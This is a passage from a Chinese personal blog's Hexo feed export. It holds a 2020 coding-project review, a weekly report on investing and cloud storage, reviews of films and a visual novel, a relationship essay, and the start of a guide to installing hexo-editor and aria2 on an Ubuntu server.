<p>🎰 <a href="https://github.com/glazec/VAE-for-CP-Decompostion">Variational Inference Solver for CP Decomposition</a> ：这个是我第一次使用 Pytorch，第一次尝试机器学习。感觉倒是不错。Pytorch 非常的简单易用，至少写网络结构的时候是这样的。比较麻烦的是训练，测试和调参的代码。这些代码的行数是网络结构的 4 倍。</p>
<p>这个项目是张量计算的期末项目。虽说是张量积算课，这个项目更需要的是机器学习的技巧。在众多的 Variational Inference Solver 中，我们最后选择了 Variational AutoEncoder 去实现 CP Decompostion 的重建。</p>
<p>这个项目主要的困难之一是对问题的定义。这个题目是教授直接扔给我们的。看到题目的那一瞬间就是迷茫，根本不知道题目里的这些术语是什么意思。在未知的领域逐渐摸索，找到思路。这可能是对大多数人来说最害怕的部分。因为在探索的过程中不知道自己的思路是否正确，离终点到底还有多远。随着截止日期的临近，这种压力会越来越大。</p>
<p>接下来的困难就是技术实现上的难题了。之前提到过我以前从来没有用过机器学习，幸亏 Pytorch 上手容易，我并没有在网络结构上吃太多的亏。主要的问题还是调参。应该用多大的网络，训练数据要多大，batch，learning rate 又分别是多少。我最后采用了 Ray 来进行自动调参。自动调参的想法很简单，就是尝试不同的超参数组合。但自动调参的代码写起来还挺多的，上百行的样子。最后的效果其实也差不多，没有想象中翻天覆地的变化。</p>
<p>💰 <a href="https://github.com/glazec/Ethereum_wallets_analysis">Ethereum wallet analysis</a> ：这是在 DEFI 火热的时候写的。用于分析某个钱包地址 DEFI 投资的表现。如果这个钱包表现好的话，我可以选择跟单，也去赚一点钱。</p>
<p>这个项目的主要难点之一是数据清洗。我从 <a href="http://zerio.io">Zerio.io</a> 上获取钱包的交易数据，用 Pandas 进行清洗。第一次使用 Pandas 清洗数据遇到不少难点。比如怎么处理日期，怎么对行和列进行操作等等的基础问题。</p>
<p>后续的分析也遇到不少问题。分析的思路很简单，首先把交易根据交易对进行分类，然后分析每个交易对的盈利情况。进一步分析就把交易对的交易记录详细分成单子。去寻找开仓和平仓的时候，然后分析这一个仓位的盈利情况。但在实际操作中会遇到各种各样的问题。比如用户不平仓，用户的交易对比较复杂，把不同的代币进行呼唤。又比如用户从其他钱包里收到了钱，然后进行交易。这些情况都使分析更加困难。或许用 Time Weighted Rate Of Return 或者 Dollar Weighted Rate Of Return 会更好。</p>
<p>即使找到了好的钱包，真正跟单的时候也很困难。由于 Defi 的高波动率，即使是 1，2 分钟的数据延迟都会对收益造成巨大影响。</p>
<p>关于区块链的新技术，新思想如果大家感兴趣的化可以考虑以后整理一下。</p>
<p>🖼️ <a href="https://github.com/glazec/daily_pics">Daily picture</a> ：这个项目可以把你在 Pixiv 和 Twitter 上点赞的插画给下载下来。我的出发点是希望把我喜欢的插画下载到本地，方便随时欣赏。毕竟一张图片包含着那么多的信息，绝对不是在手机上一眼扫过去 3 秒内能够欣赏完的（上完艺术史的课才意识到一张画应该如何去体会）。因此我采用了增量更新的方式。如果你是第一次运行脚本，它会下载你最近喜欢的 50 张图片。当你下次运行脚本时，它只会下载你最新喜欢的所有图片。</p>
<p>这个项目的难点只是挑选合适的库。好用的 Pixiv 库还真的不多，大部分都有点缺胳膊少腿的感觉。</p>
<p>✉️ <a href="https://github.com/glazec/hexo-web-push-notification">Webpush notification</a> ：这是我今年的第一个项目。它可以帮助基于 Hexo 的博客给读者通过浏览器推送通知。如果你希望你的读者能够第一时间知道你的更新，这个插件非常的实用。</p>
<p>在实际开发的过程中，遇到最大的问题就是 Hexo 文档。Hexo 的文档挺简陋的，关于插件开发在网上也没有太多的资料，大部分时候都得自己动动脑子。 而且制作插件也没有什么配套的开发或者 Debug 工具，得自己用最原始的方式慢慢来。</p>
<p>🚗 <a href="https://github.com/glazec/common_vps_setup">Ansible playbook for common VPS setup</a>：在之前折腾新的 VPS 的时候，我采用了 Ansible 来做自动化部署。Ansible 我在以前介绍过，可以很方便的进行自动化运维，强大的 Devop 工具。这个仓库包含了我自己常用的 Ansible 脚本。</p>
<p>☁️ <a href="https://github.com/glazec/BlenderCloudRender">BlenderCloudRender</a>：用 VPS 或者免费的 Goolge Colab 来渲染自己的 3D 作品。那段时间我特别喜欢做一些 3D 的东西。但是 3D 的东西渲染又很慢。所以动手写了这样一个脚本可以把渲染放在云端。由于专业的渲染服务器太贵，我就选择了把渲染交给便宜的 VPS 或者免费的 Google Colab。</p>
<p>这个项目的难点在于和服务器通信。和服务器搭建了 SSH 连接后怎么跟它进行通信，怎么要求它执行脚本，如何获取脚本执行结果。</p>
<p>➕ ShuttleBus：这个项目是优化班车排班，是我运筹学的扩展。由于全程调用 Google 的 OR 库，其实并没太要求运筹学。</p>
<p>项目的难点在于将问题建模，变成一个个 constraint。然后将这些 constratint 按照文档一个个变成代码。有一些比较偏门的 constraint 我找了很久。另一个难点便是数据。由于要求每段路程的驾车时间，如何获取这些时间。如果我们从导航上获取这些时间，可信度又是多少？我们需要基于统计学给出一些解释。</p>
<p>🕸️ <a href="https://github.com/glazec/hexo-cheatsheets">Hexo cheatsheet</a> ：这也是今年上半年的一个项目。现在看来这就是个换皮项目。将别人的 cheatsheets 网站样式扒下来放到 Hexo 里去。当初觉得自己需要一个记录 cheatsheet 的网站，但实际做完以后发现不如 Notion 好用。</p>
<p>我的 CSS 一直挺菜的，做这个最挣扎的就是改 CSS 和模板文件。</p>
<p>⚙️ <a href="https://github.com/glazec/tool-box">Tool Site</a>：这个网站计划是来展示我的工具的。随着使用的工具越来越多，我觉得有必要记录并且展示这些工具。但最后还是发现不如 Notion 好用。</p>
<p>由于我不擅长写 CSS，我前期使用了可视化的网站开发工具。把样式做好了以后直接导出 React 代码，自己再给它接上数据就行了。实际使用体验还不错，基本避过了我最讨厌的 CSS。缺点之一是导出的 React 代码有点奇怪，用了不少那个开发工具定制化的组件。另一个缺点就是接上数据以后的项目就不能重新倒入了。不太方便迭代。</p>
<p>🖼️ <a href="https://github.com/glazec/gallery">Gallery</a>：这是个半成品，是作为 Daily Picture 的前端。原来的构想是可以有一个网页来欣赏自己喜欢的插画。希望这个网页可以尽可能大的展示插画。但是由于我自己养成不了欣赏以前喜欢的插画的原因，不了了之。</p>
<p>🖼️ <a href="https://github.com/glazec/imageExcerpt">ImageExcerpt</a>：Gallery 的配套工具。用于给一个帖子几十张图片生成预览图。思路是我们提取每一张图片的调色盘。接着我们按照图片顺序，将这些调色盘一行行的堆叠起来。这样只看预览图就可以感受到这个帖子里图片的色调和情感。</p>
<p>📔 <a href="https://github.com/glazec/hetushu">Hetushu</a> ：这是一个很简单的项目。只是把小说从网站上扒下来。</p>
<p>这个项目的难点是后续去除广告。网站的反爬措施之一就是添加了很多广告在正文。网页浏览时看不见，但你把文字扒下来的时候就会发现这些千奇百怪很难用正则匹配去除的广告。</p>
<h1 id="明年">明年</h1>
<p>明年也就是 2021 年已经来了。2021 年应该是比较重要的一年，因为大学要毕业了。这一年的决定将会直接影响未来的 2-3 年。到底是走哪个方向呢？数据科学？应用数学？区块链？</p>
<p>明年希望能够拓展一下知识面。多看一点书，多学学其他的东西。就目前来看，希望 2021 年可以看一些诗词有关的书。古人对于字词的精确运用令人叹为观止。作为一个讲白话文的现代人也只有羡慕的份了。举个例子，大家可以感受一下古人的用词。“小山重叠金明灭，鬓云欲度香腮雪”来自温庭筠写的菩萨蛮。如果让我来概括这句词，大概就是大中午的，女孩子还在睡觉。这画面感，韵味差的实在是太远了。原词中对颜色运用强烈的刺激着读者的感官。明年希望以次为契机，能够提升对字词的运用。</p>
<p>生活在一个法治社会，不学习一点法律怎么行。希望明年通过罗翔的视频了解一下中国的法律，也是了解一下专精于法律的人他们是怎么思考的。</p>
<p>不少人对明年的区块链都抱有期待。期待看到 DEFI 催化的一系列变动。我也是挺希望明年能够以开发者去加入这个生态。现在以太坊的手续费实在是太高了，我一再怀疑是不是只能做一些跟钱有关的应用。只有更多的利益能够战胜更高的手续费。今年区块链的热门项目都跟经济学有着很大变化。一个好的激励措施可以让用户真正自发的参与到项目当中去。经济学或许会应用到未来更多的区块链项目中。要不是学校里经济专业的预备课程打分太低，我都想修经济专业了。</p>
<p>另一个比较重要的是对知识和信息的整理。今年磕磕绊绊开始使用 Notion 了。用 Notion 来记录一些比较好用的工具，整理一些笔记和知识。实际需要用到这些笔记的次数也在不断增加。随着记录越来越多的东西，今后可能会更加频繁的回过头来找些什么。整理信息是明年最重要的，我需要一个存储空间更大的脑子。</p>
<p>类似于信息整理，下半年上网课的时候我发现了 Figma 非常适合用来做笔记。它强大的排版功能让我随心所欲的整理知识点。把重要的定义或者公式截图下来根据章节放到不同的 Frame 里。目前最大的问题在于索引。没办法搜索图片中的文字，或者知识点。另一个问题是图片的尺寸大小不一，字或大或小，不太工整。看看明年怎么改进一下，应该不会太难。大不了写两个插件。这种无限大小的画布用来整理知识点真的很赞。</p>
<p>祝各位读者新的一年要快乐，自由，有意义。</p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
        <tag>年终小结</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年第29周</title>
    <url>/posts/9d9931d5/</url>
    <content><![CDATA[<p>第一次写周报。看看这周做了什么，下周准备做什么。 <a id="more"></a> # Weekly Report 7 月第四周</p>
<h2 id="这周做了什么">这周做了什么</h2>
<h3 id="买美股">买美股</h3>
<p>在学习了一些股票的基本知识后，开始分析和选择投资组合。原本以为需要写点代码来进行分析和统计计算，其实用 <a href="https://www.portfoliovisualizer.com/">Portfolio Visualizer</a> 就可以做的七七八八了。</p>
<p>最后选中了 3x S&amp;P500 加 3x 20yr+ 债券的组合。由于这个组合波动太大，我又增加了黄金和 SWAN（据称避免黑天鹅事件的重大损失）。疫情期间 SWAN 的跌幅只有 3%。</p>
<p>交易日志和组合的表现除了可以在交易所的 App 中进行查看，我自己还在 <a href="https://coda.io/docs">Coda</a> 中构建了一份文档。每当要做这种比较复杂的记录，Notion 和 Coda 的确比 Markdown ，Excel ，Word 好用太多。我本来想用 Excel 来记录数据，但是 Excel 对文本的表现一般。后来想到用 Markdown ，但是 Markdown 的数据处理能力并不好。最后选择了 Coda。里面可以写一段段的文字，也可以做表格，画图表。它还支持自动化，也有股票插件。我可以设置为每天定时运行，自动获取股票价格，自动计算组合的价值并记录下来。</p>
<h3 id="配置云盘">配置云盘</h3>
<p>学校送了 G suite 和 Box。这个 Box 不是 Dropbox，是云盘业务的开拓者。学校还特意比较了 Box 和 Dropbox ，对比图中都是 Box 有但是 Dropbox 没有的功能（恰饭警告）。</p>
<p>我选择 Google Drive 来作为我的云空间（无限容量）。通过 Good Sync 来把本地电脑一些用不到的东西给备份上去，关闭 Propagate Deletion 后就可以把本地的东西给删了。下次把新的文档放进来后又会开始自动同步。有点想念其他软件的 Smart Sync 或者 Selective Sync 的功能。不用的文件会以占位符的形式存放在本地，要用的时候再下载下来。</p>
<p>我们可以通过 Drive File Stream 来将云盘挂在到本地电脑。相比 Smart Sync 和 Selective Sync ，缺点是一个文档可能会在本地找到，也可能得到挂载在本地的云盘中找到。文档可能存放的地方从一个变成了两个。</p>
<p>有云盘的一个好处是音乐。如果电脑上的音乐备份到了云端的话，我们可以通过流传输直接在手机上听到电脑上的音乐 。同理，视频也可以直接流传输了。</p>
<p>另一个好处是 Full Text Search。云端的搜索功能很强，支持按类型，日期等进行搜索。搜索的范围除了文件名，文件信息等还包括文件的内容（如果是文本文件的话），和图片内容。云端的图片管理比本地好上不少，你也可以进一步在云端为这些照片打上标签或帮助云端进行人脸识别和分类。云端的搜索速度也比本地快。但是目前启动器（ Wox ，Flow ）等只支持本地的文件搜索，而并不支持云端文件搜索。</p>
<h3 id="gre-准备">GRE 准备</h3>
<p>背完了第一遍单词后，开始了单词复习。百词斩竟然要求一天复习 600 个，难为了我这个脑子。题型的学习也开始了，接下来就是单词和做题并进。</p>
<p>淘宝上买的 GRE 模考软件很奇怪，需要以管理员权限安装和运行，并且关闭微软的杀毒软件。一个模考软件需要管理员权限运行的确有点奇怪。或许之后我可以尝试分析一下（二进制分析捡起来）。目前我将其运行在 Sandboxie 中，效果非常的不错，沙盒的启动也非常的快。</p>
<h3 id="死亡搁浅">死亡搁浅</h3>
<p>有些人说死亡搁浅无聊，因为前几章送快递没有高级装备，没有道路，没有载具 ，单纯送货很劝退。但其实我觉得前几章的送快递才是最有意思的。游戏的 UI 占据屏幕很小的位置，人物的血条等信息也是隐藏的。玩家可以最大程度的沉浸在这个世界中，观赏风景，聚精会神的走路，选择最好的道路，与自然和 BT 做抗争。</p>
<p>道路修起来了之后，虽然送货效率的确大大增加了，但我发现开车在高速公路上是一件很机械和无聊的事情。横跨整个地图的黑色道路也极大的破坏了风景。现代社会再也回不去原始社会了。回不到一个人在地图里艰难送货的时候。现在开着车送货，脑子里会想着下一单应该往哪里跑。生活节奏大大加快。唯一的鼓励就是其他玩家使用我的道路后，我收到了赞。</p>
<p>接下来要进雪山了，据说又是枯燥的送货路程，看看能不能回到起点，感到艰难和小心翼翼。</p>
<h3 id="修复蓝牙">修复蓝牙</h3>
<p>在更新了 Windows 后蓝牙挂了。通过在 Intel 官网更新驱动修好了蓝牙。</p>
<h3 id="ie80-声相">IE80 声相</h3>
<p>由于蓝牙挂了一短时间，用起了 IE80 。发现 IE80 的声响往右偏。解决方法也挺简单的，别把右边的耳塞塞得那么紧。把 IE80 挂在耳朵口就行，别当他是个入耳式。</p>
<h2 id="下周做什么">下周做什么</h2>
<ul>
<li>看看能不能把我所有的文档入口集成到启动器当中，即在启动中可以搜索云端文件。</li>
<li>想买个电钢琴</li>
<li>优化文件管理</li>
<li>探索个人通知的实践</li>
</ul>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>投资</tag>
        <tag>游戏</tag>
        <tag>云盘</tag>
      </tags>
  </entry>
  <entry>
    <title>四月物语&amp;情书</title>
    <url>/posts/d77c7ef8/</url>
    <content><![CDATA[<p>这才是真正的温暖人心。 <a id="more"></a></p>
<p>最近没打什么游戏，改变了一下作息。早上看书；下午写码；晚上学混音，休息。这几天也是看了两部岩井俊二的老电影。二十年前的四月物语，二十三年前的情书。</p>
<center>
<img class="lazyload" data-src="/static/images/AprialStoryLoveLetter-1.jpg" height="80%" width="80%">
</center>
<p>四月物语是我第一部接触的岩井俊二的电影。这部电影的光影就泛着那种年代感，现在已经很少能够看见这种暖色调的电影了。整部电影围绕着非常稀疏平常的事情-一个女孩初入大学的生活进行叙述。电影的节奏跟背景音乐一样，悠然，平淡如水，就像四月的暖阳，不灼，但又帮你带走了冬日的寒冷。或许我的生活跟她不一样，又或者她那暗恋-爱的力量并没有跟我产生共鸣，对这部片子我倒是没有特别大的感触。</p>
的确，这部电影的一些镜头十分的唯美。例如女主在樱花树下抖落衣服中的樱花，总觉得是唯美的愉快。还有那带着绚烂光影的尽头。
<center>
<img class="lazyload" data-src="/static/images/AprialStoryLoveLetter-2.png" height="80%" width="80%">
</center>
<p>第二部是情书。这又是一部老电影，但的确给人的感觉和平淡如水的四月物语不同。岩井俊二通过特别的拍摄叙事手法，赋予了这样一部青春爱情电影悬疑推理片的感觉。</p>
<p>在这样一部唯美的电影里，给博子的开头是一片白茫茫的雪地，以葬礼作为序曲，给博子的最后一个镜头也是白茫茫的雪地，或许以献给过去的葬礼为尾声。</p>
<p>我第一次认真思考情书，是源自想要传达给你的爱恋这一款游戏。情书，就是要将自己那份手足无措的心意，满怀期待地告诉对方；要是让对方误解了自己一片真诚的信，这不是很可惜么。</p>
<p>情书这部电影便是讲述了对一封跨越时光的情书的追寻。在追寻的过程中所表现出来的青春，爱情是显而易见的。每个人都是一封动人的情书，在追逐着谁，又或者被谁追逐着。情书或许跟酒一样，也是会发酵的。待时机成熟，打开那份属于自己的情书，就跟树一样，收到数十年前的情书，让她收获埋藏在心底的悸动。还记得最后一个镜头吗？一群少女叽叽喳喳的将这封情书送给了树。那时的树或许重新体会到了青春的羞涩，她想把情书揣进兜里，没有兜的衣服，不留给她保存那份属于她的情书的机会。相信那份甜蜜又酸涩的感觉会永远的留在心底。</p>
<p>岩井俊二总是喜欢拍青春片，而且这些片子里总是洋溢着青春，平凡的气息。四月的物语像一首散文，情书却是一部悬疑小说。但是它们的主旨都是一样的，想要将青春的感觉传达给观众。青春的悸动，青春的甜蜜，青春的酸涩与青春的悔。</p>
]]></content>
      <categories>
        <category>Film</category>
      </categories>
      <tags>
        <tag>Film</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello Lady</title>
    <url>/posts/3bbdcb8e/</url>
    <content><![CDATA[<p>又是一个瑰丽的故事，一个绚丽的世界。序幕，落幕，留下的只是惊叹，与不满足般的期待。 <a id="more"></a></p>
<h2 id="intro">Intro</h2>
<p>最近特别喜欢玩各种故事性很强的游戏。Hello Lady（淑女同萌）就是这样一款Galgame。与其把它局限于Galgame，不如将它定位于Visual Novel，因为它的男主可是有配音的，而且是表现力爆炸的配音，并且这部作品的重点也并不是爱情。</p>
<p>这部作品可以说是把Visual Novel的特质发挥到了极致。通过声优来极力表现人物的性格和情绪。通过CG来刻画场景，烘托气氛。当然也不能忘记BGM，这部作品的OST质量是颇高，由Angle Note制作。OST总是适时的出现，烘托出恰当的氛围，再加上表情多样的立绘，很好的把情绪传达给了读者。音无朔作为女一号，拥有两套衣服，三种动作，每种动作多至57种表情。就连男主也有19种表情。当然，别忘了还有文字。小说的主体便是文字。在Hello Lady中，干巴巴的对话十分少见。取而代之的是生动，有趣，形象的对话<em>（毕竟用了不少修辞手法）</em>，再加上环境描写，与少许人物内心心理活动。<em>（我想吐槽一下<a href="https://blog.inevitable.tech/2018/07/07/koikake/">想要传达给你的爱恋</a>那略显啰嗦，充满逻辑的男主的心理活动）</em>绝赞的文字，音乐，CG，立绘所带来的听觉，视觉，与思维，多感官的享受，值得尝试。</p>
<h2 id="剧情">剧情</h2>
这款游戏采取了剧情锁的设定。攻略顺序为赤人珠绪，桂木空子，鹰崎绘留，音无朔。剧情锁是有些烦，你需要一遍又一遍地走过共通线，但这一作的剧情锁是较为合理的存在。跟着游戏设计者的脚步，逐渐掀起黑幕。赤人珠绪和桂木空子两线对于黑幕并没有过多的揭示，对于真相的探索并未深入。这两条线更像是在讲述男主的复仇故事。鹰崎绘留-音无朔的骑士的个人线开始，对于真相的探索便开始加速，伏笔继续在不断的埋下。朔性格魔化，外形却又不是魔化的样子给玩家留下了深深的疑问。而这最后的真相，在音无朔线的最后突然揭示了出来。总觉得音无朔线中车速过快，剧情在最后一波四折。
<center>
<img class="lazyload" data-src="/static/images/HelloLady-1.png" height="80%" width="80%">
</center>
<p>总的来说，虽然前两线对于真相探索的速度过慢，但是对于女孩子背后故事的讲述也是颇为精彩。没有让剧情归于平淡或灌水得益于鲜明的人物以及人物之间的矛盾。如果说共通线是描述世界观以及为之后的剧情埋下伏笔，那么个人线就是着力在描绘人物之间的矛盾了。人物围绕着矛盾-通常是男主的复仇-上演着爱恨相交的舞台剧。在这之中，还有一个更宏大的矛盾即学院理念-至尊与男主的理念-个人意志的冲突。</p>
<p>对于个人意志的讨论也体现在了个人线中。 * 赤人珠绪：血脉和家族背景对个人意志的禁锢 * 桂木空子：过分为其他人考虑的空子，以及空子的另一个人格-响己对于自我的认知。响己由于是七年前诞生的人格，没有过去的记忆，因此一直感到自卑，深深地质疑这自己的人格。 * 鹰崎绘留：音无朔忠诚的骑士，一个被称为次品的道具，一个没有心，演绎表情的少女。感到讽刺的是她的能力便是唤起他人心中的爱。不能掌握这样的能力，因此被称为次品。或许无心的人永远没有唤醒别人爱的资格。 * 音无朔：因为害怕，躲避现实的少女。因为躲避，一而再再而三犯下错误。 最后都是以喜剧结尾。</p>
<p>剧情的薄弱点在于对爱情的描写。玩着全年龄版，我甚至冒出了疑问：难道这个个人线只是单纯讲述个人的故事么，男主和女主最后并不会在一起么？虽然爱情薄弱，其他的情感都不薄弱，而且还有人物间的矛盾加强着情感。</p>
<h2 id="人物">人物</h2>
<p>每个人都有着鲜明的形象。或许这得益于舞台剧那略显夸张的风格。与其他Galgame不同，这里给我留下最深刻印象的便是男主了。那夸张的个性，对于誓言的坚持，以及对于美的追求无不给我留下深刻的印象。他就像歌剧上的主角，歌颂着自己的故事，等待着自己的下场。</p>
不良少女赤人珠绪，关心着别人的柔弱女孩桂木空子至始至终演绎着属于自己的舞台剧。我最喜欢的便是鹰崎绘留-这个忠诚的骑士，在寻找自我的道路上稳步前行。她有着独特的说话风格-毒舌吐槽。在尴尬的气氛中，跳出来救场通常是她。略带做作的情绪中带着一丝虚假，也许在她找回了心后，一切都会变得自然。鹰崎绘留线的矛盾便是骑士的职责所在。到底是保护王，还是一丝不苟的执行王的命令，与之一齐堕落。鹰崎绘留凭借着自己的意志，对王的忠诚，找到了答案。
<center>
<img class="lazyload" data-src="/static/images/HelloLady-2.png" height="80%" width="80%">
</center>
就像成田真理所说的，音无朔就是那个光芒闪耀之人-对的起至尊这个称号。她对自己意志的贯彻，无愧于光芒闪耀的评价。作者塑造了这样一个坚强的朔，但是他的塑造手法很奇特。作者对于成长这个概念进行了诠释，在结局之前，朔在不断的成长。从外在看，她一向是皇冠的顶端，贯彻着自己的意志-对学院的守护。但当男主走进朔，才发现她也在迷茫。没有其他人那样特殊的成长经历和家庭背景，朔只是一个普通人。但是她的坚强却超过了其他人。朔就像那只翅膀流血的鸟，坚强的飞向天空。通过一次又一次的迷茫，朔逐渐明白了如何贯彻自己的意志，如何明确自己的意志。她在属于自己的结局绽放了最闪耀的光芒。
<center>
<img class="lazyload" data-src="/static/images/HelloLady-3.png" height="80%" width="80%">
</center>
<h2 id="ui">UI</h2>
<p>UI有种复古，华丽的感觉。文本框那复杂的花纹，给我厚重的感觉。章节选择中，那精心的分章，以及章节名生动的暗示了故事的进展。当然最棒的还是频谱分析仪，在播放bgm的时候，UI的底端会显示频谱图，这是我最喜欢的。</p>
<h2 id="声优">声优</h2>
<p>男主，成田真理的声优演技爆表。那种夸张，自信的怪人角色被演绎的淋漓尽致。当然最棒的还是鹰崎绘留的声优，除了出色的演绎中略微三无的少女，还有那动听的声线-萝莉声线带有一些脏的感觉。接下来就是御门瑠璃的黑化了。那种对疯狂，病态的演绎，角色从一个疯子女王切换成一个疯子妹妹，声优很好的传达了该有的情绪和氛围。</p>
<h2 id="作画">作画</h2>
立绘的表情是真的多，CG质量还算可以，场景倒是比较多。
<center>
<img class="lazyload" data-src="/static/images/HelloLady-4.png" height="80%" width="80%">
</center>
<hr>
<center>
<img class="lazyload" data-src="/static/images/HelloLady-gift.png" height="80%" width="80%">
</center>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>好女朋友的标准</title>
    <url>/posts/19e49369/</url>
    <content><![CDATA[<p>有一个体贴的对象不容易啊。 <a id="more"></a> 女朋友和朋友不一样。朋友更多是兴趣相投，而女朋友更多的却是信任，你将你的生活与她分享，相信她，对她有所期望。</p>
<p>在这个世纪里，乔布斯重新定义了手机，罗永浩重新定义了重新定义了未来 10 年的个人电脑，但是没有人重新定义女朋友，也没有人定义女朋友。一个好的女朋友应该是什么样的呢？当然我觉得在这个男女平等的社会里，男朋友和女朋友的角色并没有多大的区别。一个好的男朋友的标准也是一个好的女朋友的定义。当然了，我希望在你享受对象给你带来福利的同时，想想自己的责任与义务。没有任何东西是免费的。就像免费的app一样，有时候免费的东西有着隐形的花费。这些隐形的花费有时候更恐怖。</p>
<h2 id="舒适">舒适</h2>
<p>跟人打交道最重要的就是营造一个舒适的气氛，能让对方感到放松，并且双方都能够从对话中感到快乐。这样，才会愿意继续呆下去。</p>
<p>说话或者请求时语气要恰当，不能带有强迫的感觉。我就总感觉女朋友的很多请求中带有强迫的味道。我不敢不答应。有时候她会说，没关系，你不答应没关系。在一些情况下这是事实，在一些情况下这却是傲娇。这种为了保护自己，为了保全自己的面子，而给他人增添麻烦的感觉真的很讨厌。这类行为本质可能就是一种傲娇，或者任性。在这种说话不坦诚的情况下，会造成多少误会呢？</p>
<p>耐心也能够帮助构建一个舒适的环境。永远有着耐心去听ta讲的话，不去打断ta正在做的事情，不去打断ta的话语会给对方舒适，没有压力和专注的感觉。</p>
<h2 id="正能量">正能量</h2>
<p>不要传播负能量，无论在哪里都不要传播负能量。传播负能量只会让对方的心情变得烦躁，对你的容忍程度下降。但这并不是说你不能说一些生活中遇到的不好的事情，而是你需要把抱怨变成一些带有正能量的话题，比如如何解决抱怨中出现的问题，或者把抱怨中的困难变成一个新奇的事情与别人分享。</p>
<h2 id="反馈">反馈</h2>
<p>请对ta说的话做出反馈，对ta的行为做出反馈。如果那个行为是你喜欢的行为，请明显的做出正面反馈，或者直接说出来。不要自己以为，ta肯定明白我刚刚那句含蓄的话语。有了这样的打击感，ta才能明白你的喜好。</p>
<p>对于ta说的话，ta的行为，你可以给出客观的反馈，例如这件事你做的不够好。但是你不能为了保护自己，或者为了面子，或者为了展示什么而去使用负能量的词汇。没有人喜欢莫名其妙的批评。优秀的人喜欢客观的评价，而不是无缘无故的黑或者无缘无故的粉。</p>
<h2 id="吵架">吵架</h2>
<p>每个人吵架的目的或许都是迫使对方屈服于自己的意志。吵架的导火索往往是一个小小的分歧。我本以为吵架是为了解决问题，即解决那个分歧而发生的。但有时候吵架会变得很奇怪，背后的原因是为了保护自己，给自己一点面子。在这种情况下，吵架便不存在逻辑。无论你有没有理，只要ta感觉不到ta想要的，ta就继续生气，继续吵架。</p>
<h2 id="包容">包容</h2>
<p>两个人在一起很容易发生分歧，如何处理这个分歧就变得至关重要。有的人会强求对方服从自己的想法。但我觉得更好的方式是求同存异。允许差异的存在，主动去包容差异。你去做你喜欢的事情，我去做我喜欢的事情。没有必要强求什么。</p>
<h2 id="无理取闹">无理取闹</h2>
<p>无理取闹真的是一件很麻烦的事情。你不能对此生气，你又很难解决这个问题。想要解决无理取闹大多得从情感层面着手，而不是现实层面。ta可能只是因为一些情感需求而无理取闹，并不是因为什么现实中的事情。</p>
<p>我对无理取闹真的没有多大办法，我只能忍着不生气，去好好的哄ta。与此同时，我对ta的评价也会逐渐降低。ta现在或许是一个优秀的女朋友，或许能够达到女朋友的标准，那以后呢？ta能达到妻子的标准吗？现在是肯定不能的。</p>
]]></content>
      <categories>
        <category>生活随想</category>
      </categories>
      <tags>
        <tag>生活随想</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo翻修</title>
    <url>/posts/d5256460/</url>
    <content><![CDATA[<p>全面翻修个人站点，并添加功能。 <a id="more"></a></p>
<h1 id="x01-introduction">0x01 Introduction</h1>
<p>我的服务器到现在为止就只运行了一个博客，而且还是hexo这样的静态博客。所有的资源全是静态的。视频和照片放在了网站目录下，设置了755的权限。这样有些浪费资源，我这样想。应该增加点什么功能。</p>
<p>不知道各位用过没有离线下载，有没有感受过国内下载国外的种子有多慢。离线下载的本质便是先把你需要下载的文件下载到服务器上，再在需要的时候把资源取回本地。离线下载的优势来自于服务器更高的带宽，强大的稳定性(自从升级到window inside，崩溃已成为家常便饭。) <img data-src="/static/images/hexo-config0.5.png" alt="windows inside" /> <img data-src="/static/images/hexo-config1.png" alt="aria高速下载" /></p>
<p>那么怎么取回本地呢? 用同步软件！ 什么东西是可以不用取回本地呢？ 视频啊！我们可以直接在线播放视频，这样可以节省不少时间。 为了方便连接这些服务，为每一个服务都设置一个子域名，并且加上https。</p>
<p><strong>我的系统是Ubuntu。</strong></p>
<h1 id="x02-hexo-edit">0x02 Hexo-edit</h1>
<h2 id="x001-introduction">0x001 introduction</h2>
<p><img data-src="/static/images/hexo-config2.png" alt="Hexo-editor" /> 我第一个部署的服务是Hexo-edit(<a href="https://github.com/tajpure/hexo-editor">传送门</a>)。Hexo-editor为编辑Hexo博客提供了一个在线的可视化的界面。以前，我通常是在本地写博客，写完后用github同步到Hexo上。Hexo-editor提供了一键publish和一键deploy。这对于把博客托管在github上的非常有用。但是对于我，把博客直接搭在vps上的人，deploy并不能实现我博客的更新。我需要修改一下程序来实现我想要的功能。并且编辑的时候，左边的可选项太少了。只有tag，time等选项。并没有comment等选项。</p>
<figure>
<img data-src="/static/images/hexo-config3.png" alt="Hexo-editor" /><figcaption aria-hidden="true">Hexo-editor</figcaption>
</figure>
<p>Hexo-editor支持插入图片，并且可以帮助你上传图片到Hexo-editor指定的目录，我需要自定义这个目录，例如我就把图片统一放在/static里。</p>
<p><em>注意：</em>请不要在heox-blog的根目录下建立一个media的文件夹，来存放所有的媒体文件：音乐，视频等。在你执行<code>hexo generate</code>的时候，会出现<code>kill</code>。原因是media目录太大，渲染失败。Hexo的渲染器对于目录大小有限制，大约在5-10M。</p>
<p>我把所有媒体文件都放在了<code>/var/www/hexo/static</code>中。注意设置权限。<code>sudo chown -R $USER:$USER /var/www/hexo/static sudo</code>,<code>chmod -R 755 /var/www/hexo</code>。</p>
<h2 id="x002-installation">0x002 Installation</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tajpure/hexo-editor.git</span><br><span class="line"><span class="built_in">cd</span> hexo-editor</span><br><span class="line">npm install --production</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure>
<p>非常简单的安装.</p>
<p>如果想要改变端口，配置文件是<code>hexo-editor/_config.yml</code>。最后请不要忘记打开端口。以端口32400为例 <code>sudo iptables -A INPUT -p tcp --dport 32400 -j ACCEPT</code></p>
<h1 id="x03-aria2-and-webui">0x03 Aria2 and WebUI</h1>
<h2 id="x001-introduction-1">0x001 Introduction</h2>
